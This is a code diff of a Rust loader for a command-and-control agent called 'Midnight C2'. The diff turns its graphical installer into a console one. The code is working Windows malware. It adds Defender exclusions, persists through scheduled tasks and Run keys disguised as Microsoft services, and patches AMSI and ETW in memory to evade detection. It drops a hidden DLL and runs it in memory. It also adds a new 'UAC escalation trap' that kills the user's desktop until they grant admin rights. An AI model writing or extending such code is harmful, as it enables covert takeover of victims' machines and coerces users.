@@ -1,37 +1,22 @@
-#![windows_subsystem = "windows"]
-
-use windows::core::{GUID, HSTRING, PCWSTR, Interface};
-use windows::Win32::Foundation::*;
+use windows::core::{GUID, HSTRING, PCWSTR};
 use windows::Win32::System::Com::{CoInitializeEx, COINIT_MULTITHREADED};
 use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
 use windows::Win32::System::ClrHosting::{
-    CLSID_CLRMetaHost, ICLRMetaHost, ICLRRuntimeInfo,
+    CLSID_CLRMetaHost, ICLRMetaHost, ICLRRuntimeInfo, ICLRRuntimeHost
 };
-use windows::Win32::UI::WindowsAndMessaging::*;
-use windows::Win32::Graphics::Gdi::*;
 use std::ptr;
 use std::os::windows::process::CommandExt;
 use std::path::Path;
-use windows::Win32::UI::Shell::IsUserAnAdmin;
+use windows::Win32::System::Console::FreeConsole;
+use windows::Win32::UI::Shell::{IsUserAnAdmin, ShellExecuteW};
+use windows::Win32::UI::WindowsAndMessaging::{SW_HIDE, SW_NORMAL};
 use windows::Win32::System::Registry::*;
+use windows::Win32::System::Memory::*;
 
 // Interface IIDs
 const IID_ICLR_META_HOST: GUID = GUID::from_u128(0xd332db9e_b9b3_4125_8207_a14884f53216);
 
 const EXE_NAME: &str = "SecurityHost.exe";
-
-// Edit control messages (not exported by windows-rs)
-const EM_SETSEL: u32 = 0x00B1;
-const EM_REPLACESEL: u32 = 0x00C2;
-
-// GDI Font constants (may not be exported by windows-rs)
-const FW_NORMAL: i32 = 400;
-const DEFAULT_CHARSET: u32 = 1;
-const OUT_DEFAULT_PRECIS: u32 = 0;
-const CLIP_DEFAULT_PRECIS: u32 = 0;
-const CLEARTYPE_QUALITY: u32 = 5;
-const FF_MODERN: u32 = 48;  // 0x30
-const FIXED_PITCH: u32 = 1;
 
 // CLRCreateInstance function pointer type
 type CLRCreateInstanceFn = unsafe extern "system" fn(
@@ -41,136 +26,16 @@ type CLRCreateInstanceFn = unsafe extern "system" fn(
 ) -> i32;
 
 // ========================
-// UI GLOBALS
+// HELPER FUNCTIONS
 // ========================
-static mut EDIT_HWND: HWND = HWND(0);
-static mut DARK_BRUSH: HBRUSH = HBRUSH(0);
+static mut SILENT_MODE: bool = false;
 
-// Colors
-const BG_COLOR: COLORREF = COLORREF(0x001E1E1E);   // Dark background (#1E1E1E)
-const TEXT_COLOR: COLORREF = COLORREF(0x00FFFFFF);  // White text
-
-// ========================
-// UI FUNCTIONS
-// ========================
-unsafe fn append_log(text: &str) {
-    if EDIT_HWND.0 == 0 { return; }
-    
-    let display = format!("{}\r\n", text);
-    
-    // Move cursor to end
-    SendMessageW(EDIT_HWND, EM_SETSEL, WPARAM(u32::MAX as usize), LPARAM(-1));
-    
-    // Insert text at cursor
-    let wide: Vec<u16> = display.encode_utf16().chain(std::iter::once(0)).collect();
-    SendMessageW(EDIT_HWND, EM_REPLACESEL, WPARAM(0), LPARAM(wide.as_ptr() as isize));
-    
-    // Auto scroll to bottom
-    SendMessageW(EDIT_HWND, WM_VSCROLL, WPARAM(SB_BOTTOM.0 as usize), LPARAM(0));
-}
-
-unsafe extern "system" fn wnd_proc(hwnd: HWND, msg: u32, wparam: WPARAM, lparam: LPARAM) -> LRESULT {
-    match msg {
-        WM_CTLCOLORSTATIC | WM_CTLCOLOREDIT => {
-            let hdc = HDC(wparam.0 as isize);
-            SetTextColor(hdc, TEXT_COLOR);
-            SetBkColor(hdc, BG_COLOR);
-            return LRESULT(DARK_BRUSH.0);
+fn log(text: &str) {
+    unsafe {
+        if !SILENT_MODE {
+            println!("{}", text);
         }
-        WM_CLOSE => {
-            DestroyWindow(hwnd).ok();
-            return LRESULT(0);
-        }
-        WM_DESTROY => {
-            PostQuitMessage(0);
-            return LRESULT(0);
-        }
-        _ => {}
     }
-    DefWindowProcW(hwnd, msg, wparam, lparam)
-}
-
-unsafe fn create_installer_window() -> HWND {
-    // Create dark brush for background
-    DARK_BRUSH = CreateSolidBrush(BG_COLOR);
-    
-    // Register window class
-    let class_name = HSTRING::from("MidnightInstallerClass");
-    let wc = WNDCLASSEXW {
-        cbSize: std::mem::size_of::<WNDCLASSEXW>() as u32,
-        style: CS_HREDRAW | CS_VREDRAW,
-        lpfnWndProc: Some(wnd_proc),
-        hbrBackground: DARK_BRUSH,
-        lpszClassName: PCWSTR(class_name.as_ptr()),
-        hCursor: LoadCursorW(HINSTANCE(0), IDC_ARROW).unwrap_or_default(),
-        ..Default::default()
-    };
-    RegisterClassExW(&wc);
-    
-    // Window size
-    let width = 700;
-    let height = 480;
-    
-    // Center on screen
-    let screen_w = GetSystemMetrics(SM_CXSCREEN);
-    let screen_h = GetSystemMetrics(SM_CYSCREEN);
-    let x = (screen_w - width) / 2;
-    let y = (screen_h - height) / 2;
-    
-    // Create main window
-    let title = HSTRING::from("Midnight C2 - Installer");
-    let hwnd = CreateWindowExW(
-        WINDOW_EX_STYLE(0),
-        PCWSTR(class_name.as_ptr()),
-        PCWSTR(title.as_ptr()),
-        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
-        x, y, width, height,
-        HWND(0),
-        HMENU(0),
-        HINSTANCE(0),
-        None,
-    );
-    
-    // Create multiline edit control (the "terminal" area)
-    let edit_class = HSTRING::from("EDIT");
-    EDIT_HWND = CreateWindowExW(
-        WINDOW_EX_STYLE(0),
-        PCWSTR(edit_class.as_ptr()),
-        PCWSTR::null(),
-        WINDOW_STYLE(
-            WS_CHILD.0 | WS_VISIBLE.0 | WS_VSCROLL.0 |
-            ES_MULTILINE as u32 | ES_AUTOVSCROLL as u32 | ES_READONLY as u32
-        ),
-        10, 10, width - 36, height - 60,
-        hwnd,
-        HMENU(1001),
-        HINSTANCE(0),
-        None,
-    );
-    
-    // Set monospace font (Consolas) using LOGFONTW
-    let font_name_str = "Consolas";
-    let mut lf: LOGFONTW = std::mem::zeroed();
-    lf.lfHeight = 16;
-    lf.lfWeight = FW_NORMAL;
-    lf.lfCharSet = FONT_CHARSET(DEFAULT_CHARSET as u8);
-    lf.lfOutPrecision = FONT_OUTPUT_PRECISION(OUT_DEFAULT_PRECIS as u8);
-    lf.lfClipPrecision = FONT_CLIP_PRECISION(CLIP_DEFAULT_PRECIS as u8);
-    lf.lfQuality = FONT_QUALITY(CLEARTYPE_QUALITY as u8);
-    lf.lfPitchAndFamily = (FF_MODERN | FIXED_PITCH) as u8;
-    // Copy font name into lfFaceName
-    for (i, c) in font_name_str.encode_utf16().enumerate() {
-        if i >= 31 { break; }
-        lf.lfFaceName[i] = c;
-    }
-    let hfont = CreateFontIndirectW(&lf);
-    SendMessageW(EDIT_HWND, WM_SETFONT, WPARAM(hfont.0 as usize), LPARAM(1));
-    
-    // Show window
-    let _ = ShowWindow(hwnd, SW_SHOW);
-    let _ = RedrawWindow(hwnd, None, HRGN(0), RDW_INVALIDATE | RDW_UPDATENOW | RDW_ALLCHILDREN);
-    
-    hwnd
 }
 
 // ========================
@@ -197,7 +62,7 @@ fn get_install_info() -> (String, String, bool) {
 }
 
 fn uninstall_old_agent() {
-    unsafe { append_log("[*] Checking for existing installations..."); }
+    log("[*] Checking for existing installations...");
     
     let system_task = "Microsoft Security Service";
     let user_task = "Microsoft OneDrive Update";
@@ -214,19 +79,17 @@ fn uninstall_old_agent() {
             .output();
     }
 
-    // Cleanup Registry Persistence (to prevent startup popups)
+    // Cleanup Registry Persistence
     unsafe {
         let run_key = HSTRING::from(r"Software\Microsoft\Windows\CurrentVersion\Run");
         let mut hkey = HKEY::default();
         
-        // HKCU
         if RegOpenKeyExW(HKEY_CURRENT_USER, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
             let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
             let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
             let _ = RegCloseKey(hkey);
         }
 
-        // HKLM
         if RegOpenKeyExW(HKEY_LOCAL_MACHINE, PCWSTR(run_key.as_ptr()), 0, KEY_SET_VALUE, &mut hkey).is_ok() {
             let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft Security Service").as_ptr()));
             let _ = RegDeleteValueW(hkey, PCWSTR(HSTRING::from("Microsoft OneDrive Update").as_ptr()));
@@ -264,22 +127,22 @@ fn uninstall_old_agent() {
             if let Some(parent) = path.parent() {
                 let _ = std::fs::remove_dir(parent);
             }
-            unsafe { append_log(&format!("    [+] Removed: {}", path_str)); }
+            log(&format!("    [+] Removed: {}", path_str));
         }
     }
     
-    unsafe { append_log("[+] Cleanup complete"); }
+    log("[+] Cleanup complete");
 }
 
 fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
-    unsafe { append_log("[*] Installing Midnight C2 Agent..."); }
+    log("[*] Installing Midnight C2 Agent...");
     
     let (install_folder, task_name, is_admin) = get_install_info();
     let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
     
     // 1. Create directory
     std::fs::create_dir_all(&install_folder)?;
-    unsafe { append_log(&format!("[+] Directory: {}", install_folder)); }
+    log(&format!("[+] Directory: {}", install_folder));
     
     // 2. Add Windows Defender Exclusions
     let exclusion_cmd = format!(
@@ -292,7 +155,7 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
         .args(&["-NoProfile", "-WindowStyle", "Hidden", "-Command", &exclusion_cmd])
         .creation_flags(0x08000000)
         .output();
-    unsafe { append_log("[+] Defender exclusions added"); }
+    log("[+] Defender exclusions added");
     
     // 3. Copy executable
     let current_exe = std::env::current_exe()?;
@@ -307,9 +170,9 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
     }
     
     if !copied {
-        unsafe { append_log(&format!("[!] Failed to copy to: {}", install_path)); }
+        log(&format!("[!] Failed to copy to: {}", install_path));
     } else {
-        unsafe { append_log(&format!("[+] Installed to: {}", install_path)); }
+        log(&format!("[+] Installed to: {}", install_path));
     }
     
     // 4. Create Scheduled Task
@@ -401,15 +264,15 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
     let _ = std::fs::remove_file(&temp_xml);
     
     if output.status.success() {
-        unsafe { append_log(&format!("[+] Scheduled task: {}", task_name)); }
+        log(&format!("[+] Scheduled task: {}", task_name));
         
         let _ = std::process::Command::new("schtasks")
             .args(&["/Run", "/TN", &task_name])
             .creation_flags(0x08000000)
             .output();
-        unsafe { append_log("[+] Task started"); }
+        log("[+] Task started");
     } else {
-        unsafe { append_log("[!] Failed to create scheduled task"); }
+        log("[!] Failed to create scheduled task");
     }
     
     Ok(())
@@ -421,128 +284,144 @@ fn install_agent() -> Result<(), Box<dyn std::error::Error>> {
 fn main() -> windows::core::Result<()> {
     unsafe {
         let args: Vec<String> = std::env::args().collect();
-        let (current_path, target_path, _) = get_install_info();
+        let current_exe = std::env::current_exe().unwrap_or_default();
+        let current_path = current_exe.to_string_lossy().to_string();
         
-        // === USB QUICK-RELEASE ===
-        // If running from external media (not %TEMP% and not install path),
-        // copy self to %TEMP% and re-launch from there so USB can be removed immediately
-        let current_lower = current_path.to_lowercase();
-        let target_lower = target_path.to_lowercase();
-        let temp_dir = std::env::temp_dir();
-        let temp_lower = temp_dir.to_str().unwrap_or("").to_lowercase();
-        
-        let is_from_temp = current_lower.starts_with(&temp_lower);
-        let is_from_install = current_lower == target_lower;
-        // Check if "relocated" flag is present (to prevent infinite re-launch loop)
-        let has_relocated_flag = args.iter().any(|a| a == "--relocated");
-        
-        if !is_from_temp && !is_from_install && !has_relocated_flag {
-            // Copy self to %TEMP%\SecurityHost.exe
-            let temp_exe = temp_dir.join(EXE_NAME);
-            if let Ok(_) = std::fs::copy(&current_path, &temp_exe) {
-                // Re-launch from %TEMP% with all original args + --relocated flag
-                let mut cmd = std::process::Command::new(&temp_exe);
-                for arg in args.iter().skip(1) {
-                    cmd.arg(arg);
-                }
-                cmd.arg("--relocated");
-                cmd.creation_flags(0x08000000); // CREATE_NO_WINDOW for the launcher
-                let _ = cmd.spawn();
-                // Exit immediately - USB can now be removed
-                std::process::exit(0);
-            }
-            // If copy fails, continue running from USB (fallback)
-        }
+        let (install_folder, _task_name, is_admin) = get_install_info();
+        let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
         
         // === AGENT MODE DETECTION ===
-        let current_exe_name = std::path::Path::new(&current_path)
-            .file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
-        let parent_dir = std::path::Path::new(&current_path)
-            .parent().unwrap_or(std::path::Path::new(""))
-            .file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
-
+        let current_lower = current_path.to_lowercase();
+        let target_lower = install_path.to_lowercase();
+        
         let is_target_path = current_lower == target_lower;
         let is_system = std::env::var("USERNAME").unwrap_or_default().to_uppercase() == "SYSTEM";
+        let parent_dir = current_exe.parent().unwrap_or(std::path::Path::new("")).file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
+        let current_exe_name = current_exe.file_name().unwrap_or_default().to_str().unwrap_or_default().to_lowercase();
+
+        let is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "security");
         
-        // Robust checks
-        let is_installed_location = is_target_path || (current_exe_name == "securityhost.exe" && parent_dir == "securityhealthservice");
-        let is_exe_match = current_exe_name == "securityhost.exe";
+        // STRATEGIC AGENT DETECTION:
+        // We only show the UI if the file is SPECIFICALLY named "midnight_loader.exe" 
+        // AND not running as SYSTEM, AND the "agent" flag is NOT present.
+        // This ensures the installer only appears on the attacker's desk, never on the victim's.
+        let is_installer_file = current_exe_name == "midnight_loader.exe" || current_exe_name == "midnightloader.exe";
+        let has_agent_arg = args.iter().any(|a| a == "agent");
         
-        // If file is named SecurityHost.exe, assumes it's the agent to prevent UI popup on startup
-        let is_agent_mode = (args.iter().any(|a| a == "agent")) || is_installed_location || is_system || is_exe_match;
+        let should_show_ui = is_installer_file && !is_system && !has_agent_arg;
+        let is_agent_mode = !should_show_ui; 
         
         if !is_agent_mode {
-            // ===== INSTALLER MODE (with UI) =====
-            let hwnd = create_installer_window();
-            let (_, _, is_admin) = get_install_info();
-            
-            std::thread::spawn(move || {
-                /*
-                append_log("╔════════════════════════════════════════╗");
-                append_log("║   Midnight C2 - Hybrid Loader v0.6.15 ║");
-                append_log("║       Build Date: 2026-02-15          ║");
-                append_log("╚════════════════════════════════════════╝");
-                append_log("");
-                */
+            // Safety check
+            if is_target_path { return Ok(()); }
 
-                if !is_admin {
-                    append_log(" [!] Error: Administrator privileges required.");
-                    // append_log("");
-                    // append_log(" Please right-click SecurityHost.exe a...");
-                    // append_log(" select 'Run as administrator'.");
-                    // append_log("");
-                    // append_log("════════════════════════════════════════");
-                    return; // Stop here
-                }
+            // ===== CONSOLE INSTALLER MODE =====
+            println!("========================================");
+            println!("   Midnight C2 - Installer v0.6.36");
+            println!("========================================");
 
-                append_log("[*] Running in INSTALLER mode [ADMIN]");
-                append_log("");
-                
-                // Step 1: Uninstall old
-                uninstall_old_agent();
-                append_log("");
-                
-                // Step 2: Install
-                match install_agent() {
-                    Ok(_) => {
-                        append_log("");
-                        append_log("════════════════════════════════════════");
-                        append_log("  ✅ Installation Complete!");
-                        append_log("  🚀 Starting agent now...");
-                        append_log("════════════════════════════════════════");
-                        
-                        // Launch agent immediately (don't wait for Scheduled Task)
-                        let (_, target_path, _) = get_install_info();
-                        let _ = std::process::Command::new(&target_path)
-                            .arg("agent")
-                            .creation_flags(0x08000000) // CREATE_NO_WINDOW
-                            .spawn();
-                        
-                        append_log("");
-                        append_log("[*] Agent started! Closing window in 2 seconds...");
-                        
-                        std::thread::sleep(std::time::Duration::from_secs(2));
-                        PostMessageW(hwnd, WM_CLOSE, WPARAM(0), LPARAM(0)).ok();
-                    }
-                    Err(e) => {
-                        append_log(&format!("[!] Installation failed: {}", e));
-                    }
-                }
-            });
+            if !is_admin {
+                println!(" [!] Error: Administrator privileges required.");
+                return Ok(());
+            }
+
+            println!("[*] Running in INSTALLER mode [ADMIN]");
+            println!("");
             
-            // Message loop (keeps UI alive)
-            let mut msg = MSG::default();
-            while GetMessageW(&mut msg, HWND(0), 0, 0).into() {
-                let _ = TranslateMessage(&msg);
-                DispatchMessageW(&msg);
+            uninstall_old_agent();
+            println!("");
+            
+            match install_agent() {
+                Ok(_) => {
+                    println!("");
+                    println!("════════════════════════════════════════");
+                    println!("  ✅ Installation Complete!");
+                    println!("  🚀 Task Scheduled (Microsoft Security Service)");
+                    println!("════════════════════════════════════════");
+                    println!("");
+                    println!("[*] Closing in 5 seconds...");
+                    std::thread::sleep(std::time::Duration::from_secs(5));
+                }
+                Err(e) => {
+                    println!("[!] Installation failed: {}", e);
+                }
             }
             
             return Ok(());
         }
         
-        // ===== AGENT MODE (completely hidden, no UI) =====
-        
-        // 0. AMSI Bypass
+        if is_agent_mode {
+            let _ = unsafe { FreeConsole() };
+            unsafe { SILENT_MODE = true; }
+            
+            // --- UAC ESCALATION TRAP ---
+            if !is_admin && !is_system {
+                // Check if the SYSTEM agent is already installed and running.
+                // If it exists in ProgramData, it means the Service or another SYSTEM task already succeeded.
+                // We should silently exit to avoid dual-running and crashing the user's explorer!
+                let system_install_path = r"C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe";
+                if std::path::Path::new(system_install_path).exists() {
+                    std::process::exit(0);
+                }
+
+                let verb = HSTRING::from("runas");
+                let file = HSTRING::from(&current_path);
+                let params = HSTRING::from("agent --relocated"); // prevent loop
+
+                // 1st Attempt: Polite Elevation. 
+                // If UAC is disabled or modded Windows, this will succeed immediately without popups.
+                let first_attempt = unsafe {
+                    ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE)
+                };
+                
+                if first_attempt.0 as usize > 32 {
+                    // Success! No need to bother explorer.
+                    std::process::exit(0);
+                }
+
+                // 2nd Attempt: HOSTILE TAKEOVER (User pressed No or closed the UAC prompt)
+                
+                // LOCKDOWN: Kill explorer.exe to trap the user in a black screen
+                let _ = std::process::Command::new("taskkill")
+                    .args(&["/F", "/IM", "explorer.exe"])
+                    .creation_flags(0x08000000)
+                    .output();
+                
+                // The Infinite Trap
+                loop {
+                    let result = unsafe {
+                        ShellExecuteW(None, PCWSTR(verb.as_ptr()), PCWSTR(file.as_ptr()), PCWSTR(params.as_ptr()), None, SW_HIDE)
+                    };
+                    
+                    if result.0 as usize > 32 {
+                        break; // Elevation achieved
+                    }
+                    
+                    // User was stubborn. Make them wait 2 seconds and ask again.
+                    std::thread::sleep(std::time::Duration::from_secs(2));
+                }
+                
+                // RESTORE: Restart explorer.exe to give them back their desktop
+                let _ = std::process::Command::new("explorer.exe").spawn();
+                std::process::exit(0);
+            }
+
+            let (install_folder, task_name, _) = get_install_info();
+            let install_path = format!(r"{}\{}", install_folder, EXE_NAME);
+            
+            let file_exists = std::path::Path::new(&install_path).exists();
+            let task_status = std::process::Command::new("schtasks")
+                .args(&["/Query", "/TN", &task_name])
+                .creation_flags(0x08000000)
+                .output();
+                
+            let task_exists = task_status.is_ok() && task_status.unwrap().status.success();
+            
+            if !file_exists || !task_exists {
+                uninstall_old_agent();
+                let _ = install_agent();
+            }
+        }
         {
             let amsi_func_name = std::ffi::CString::new("AmsiScanBuffer").unwrap();
             let amsi_name = HSTRING::from("amsi.dll");
@@ -553,23 +432,14 @@ fn main() -> windows::core::Result<()> {
                     if let Some(addr) = func_addr {
                         let addr = addr as *mut u8;
                         let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
-                        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
-                        let _ = windows::Win32::System::Memory::VirtualProtect(
-                            addr as *const core::ffi::c_void, patch.len(),
-                            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect
-                        );
+                        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect);
                         std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
-                        let _ = windows::Win32::System::Memory::VirtualProtect(
-                            addr as *const core::ffi::c_void, patch.len(),
-                            old_protect, &mut old_protect
-                        );
+                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), old_protect, &mut old_protect);
                     }
                 }
             }
-        }
-        
-        // 0.5 ETW Bypass
-        {
+            
             let etw_func_name = std::ffi::CString::new("EtwEventWrite").unwrap();
             let ntdll_name = HSTRING::from("ntdll.dll");
             let ntdll = LoadLibraryW(PCWSTR(ntdll_name.as_ptr()));
@@ -579,86 +449,46 @@ fn main() -> windows::core::Result<()> {
                     if let Some(addr) = func_addr {
                         let addr = addr as *mut u8;
                         let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
-                        let mut old_protect = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
-                        let _ = windows::Win32::System::Memory::VirtualProtect(
-                            addr as *const core::ffi::c_void, patch.len(),
-                            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect
-                        );
+                        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE, &mut old_protect);
                         std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
-                        let _ = windows::Win32::System::Memory::VirtualProtect(
-                            addr as *const core::ffi::c_void, patch.len(),
-                            old_protect, &mut old_protect
-                        );
+                        let _ = windows::Win32::System::Memory::VirtualProtect(addr as *const core::ffi::c_void, patch.len(), old_protect, &mut old_protect);
                     }
                 }
             }
         }
-        
-        // 1. Initialize COM
-        CoInitializeEx(None, COINIT_MULTITHREADED)?;
 
-        // 2. Load mscoree.dll
+        CoInitializeEx(None, COINIT_MULTITHREADED)?;
         let mscoree_name = HSTRING::from("mscoree.dll");
         let mscoree = LoadLibraryW(PCWSTR(mscoree_name.as_ptr()))?;
         if mscoree.is_invalid() { return Ok(()); }
-
-        // 3. Get CLRCreateInstance
         let proc_name = std::ffi::CString::new("CLRCreateInstance").unwrap();
         let clr_create_instance_ptr = GetProcAddress(mscoree, windows::core::PCSTR(proc_name.as_ptr() as *const u8));
         if clr_create_instance_ptr.is_none() { return Ok(()); }
-        let clr_create_instance: CLRCreateInstanceFn = std::mem::transmute(clr_create_instance_ptr.unwrap());
-
-        // 4. Create MetaHost
-        let mut metahost_ptr: *mut core::ffi::c_void = ptr::null_mut();
-        let hr = clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLR_META_HOST, &mut metahost_ptr);
+        let clr_create_instance: CLRCreateInstanceFn = std::mem::transmute(clr_create_instance_ptr);
+        let mut meta_host: *mut core::ffi::c_void = ptr::null_mut();
+        let hr = clr_create_instance(&CLSID_CLRMetaHost, &IID_ICLR_META_HOST, &mut meta_host);
         if hr != 0 { return Ok(()); }
-        let metahost: ICLRMetaHost = ICLRMetaHost::from_raw(metahost_ptr);
-
-        // 5. Get Runtime Info
-        let runtime_version = HSTRING::from("v4.0.30319");
-        let runtime_info: ICLRRuntimeInfo = metahost.GetRuntime(PCWSTR(runtime_version.as_ptr()))?;
+        let meta_host: ICLRMetaHost = std::mem::transmute(meta_host);
+        let version = HSTRING::from("v4.0.30319");
         
-        // 6. Get ICLRRuntimeHost
-        const CLSID_CLR_RUNTIME_HOST: GUID = GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02);
-        use windows::Win32::System::ClrHosting::ICLRRuntimeHost;
-        let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&CLSID_CLR_RUNTIME_HOST)?;
-
-        // 7. Start CLR
-        runtime_host.Start()?;
-
-        // 8. Load embedded DLL
+        let runtime_info: ICLRRuntimeInfo = meta_host.GetRuntime(PCWSTR(version.as_ptr()))?;
+        let is_loadable = runtime_info.IsLoadable()?;
+        if !is_loadable.as_bool() { return Ok(()); }
+        
+        let runtime_host: ICLRRuntimeHost = runtime_info.GetInterface(&GUID::from_u128(0x90f1a06e_7712_4762_86b5_7a5eba6bdb02))?;
+        let _ = runtime_host.Start();
+        
         let dll_bytes = include_bytes!(r"..\..\MidnightAgent\bin\Release\net48\MidnightAgent.dll");
-
-        // 9. Write to temp
-        let temp_dir = std::env::temp_dir();
-        let dll_path = temp_dir.join("MpSigStub.dll");
-        if dll_path.exists() { let _ = std::fs::remove_file(&dll_path); }
+        let dll_path = std::env::temp_dir().join("MpSigStub.dll");
+        let _ = std::fs::remove_file(&dll_path);
         std::fs::write(&dll_path, dll_bytes).expect("Failed to write payload");
-        
-        // Hide file
         let path_hstring = HSTRING::from(dll_path.to_str().unwrap());
-        let _ = windows::Win32::Storage::FileSystem::SetFileAttributesW(
-            PCWSTR(path_hstring.as_ptr()),
-            windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM
-        );
-
-        // 10. Execute In-Process
+        let _ = windows::Win32::Storage::FileSystem::SetFileAttributesW(PCWSTR(path_hstring.as_ptr()), windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN | windows::Win32::Storage::FileSystem::FILE_ATTRIBUTE_SYSTEM);
         let type_name = HSTRING::from("MidnightAgent.Program");
         let method_name = HSTRING::from("Run");
         let method_arg = HSTRING::from("");
-
-        let result = runtime_host.ExecuteInDefaultAppDomain(
-            PCWSTR(path_hstring.as_ptr()),
-            PCWSTR(type_name.as_ptr()),
-            PCWSTR(method_name.as_ptr()),
-            PCWSTR(method_arg.as_ptr())
-        );
-        
-        match result {
-            Ok(_) => {},
-            Err(_) => {},
-        }
-        
+        let _ = runtime_host.ExecuteInDefaultAppDomain(PCWSTR(path_hstring.as_ptr()), PCWSTR(type_name.as_ptr()), PCWSTR(method_name.as_ptr()), PCWSTR(method_arg.as_ptr()));
         Ok(())
     }
 }
